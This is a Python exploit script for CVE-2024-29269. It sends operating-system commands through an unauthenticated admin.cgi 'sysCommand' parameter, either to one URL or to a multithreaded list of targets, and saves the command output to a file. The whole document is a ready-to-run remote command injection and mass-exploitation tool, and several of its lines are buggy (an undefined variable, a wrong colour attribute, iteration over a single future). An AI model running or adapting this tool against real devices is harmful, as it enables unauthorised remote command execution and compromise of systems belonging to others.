#!/bin/env python3

import requests
import re
import threading
from colorama import Fore, Style
import argparse
from concurrent.futures import ThreadPoolExecutor

def banner():
   
    print('\n'+Fore.YELLOW + Style.BRIGHT +f'CVE-2024-29269\nRewritten:Jhonson' + Style.RESET_ALL+'\n') 

banner()

def main(list, cmd):
 
 try:
  
    with open(list, "r") as f:
      for line in f:
         list_strip=line.strip()
          
         url=f'{list_strip}/cgi-bin/admin.cgi?Command=sysCommand&Cmd={cmd}'
         r=requests.get(url,verify=False, timeout=30)
         if r.status_code==200:
           regex  = r'<CmdResult><!\[CDATA\[(.*?)\]\]></CmdResult>'
           matche = re.search(regex, r.text,re.DOTALL)
           print(Fore.GREEN + Style.BRIGHT +list_strip.strip()+' is vulnerable'+Style.RESET_ALL)
           with open('output.txt', 'a') as file:
                file.write(list_strip+'\n'+matche.group(1))             
         else:
           print(Fore.red + Style.BRIGHT +list_strip.strip()+' is no vulnerable '+matche.group(1).strip())
            

 except requests.exceptions.MissingSchema:
            print('')
 except AttributeError:
            print('')  

def simple_target(url,cmd,dir):
   try:
       r=requests.get(str(url)+f'{dir}{cmd}', verify=False,timeout=20)
       if r.status_code==200:
           regex  = r'<CmdResult><!\[CDATA\[(.*?)\]\]></CmdResult>'
           matche = re.search(regex, r.text,re.DOTALL)
           print(Fore.GREEN + Style.BRIGHT +url+' is vulnerable'+Style.RESET_ALL)
           with open('output.txt','a') as write:
                 write.write(list_strip.strip+'\n'+matche.group(1))
                 print(Fore.BLUE + Style.BRIGHT +'File saved output.txt'+Style.RESET_ALL)

       else:
           print(Fore.red + Style.BRIGHT +url+' is no vulnerable '+matche.group(1))

   except requests.exceptions.MissingSchema:
          print('')
     

def threads(list, cmd):

  try:
    with ThreadPoolExecutor(max_workers=40) as executor:
        futures = executor.submit(main,list,cmd) 
        for future in futures:
            result = future.result()
            
            print(result)

  except TypeError:
        print('')

if __name__=='__main__':
           
       parser = argparse.ArgumentParser(description="CVE-2024-29269")
       parser.add_argument("-list", "--list", dest="list", help="list urls", required=False)
       parser.add_argument("-url", "--url", dest="url", help="url", required=False)
       parser.add_argument("-cmd", "--cmd", dest="cmd", help="command injection", required=False)          
       args = parser.parse_args()

       print(Fore.BLUE + Style.BRIGHT +'File saved output.txt'+Style.RESET_ALL)      
       threads(args.list,args.cmd)
       simple_target(args.url,args.cmd,f'/cgi-bin/admin.cgi?Command=sysCommand&Cmd=')
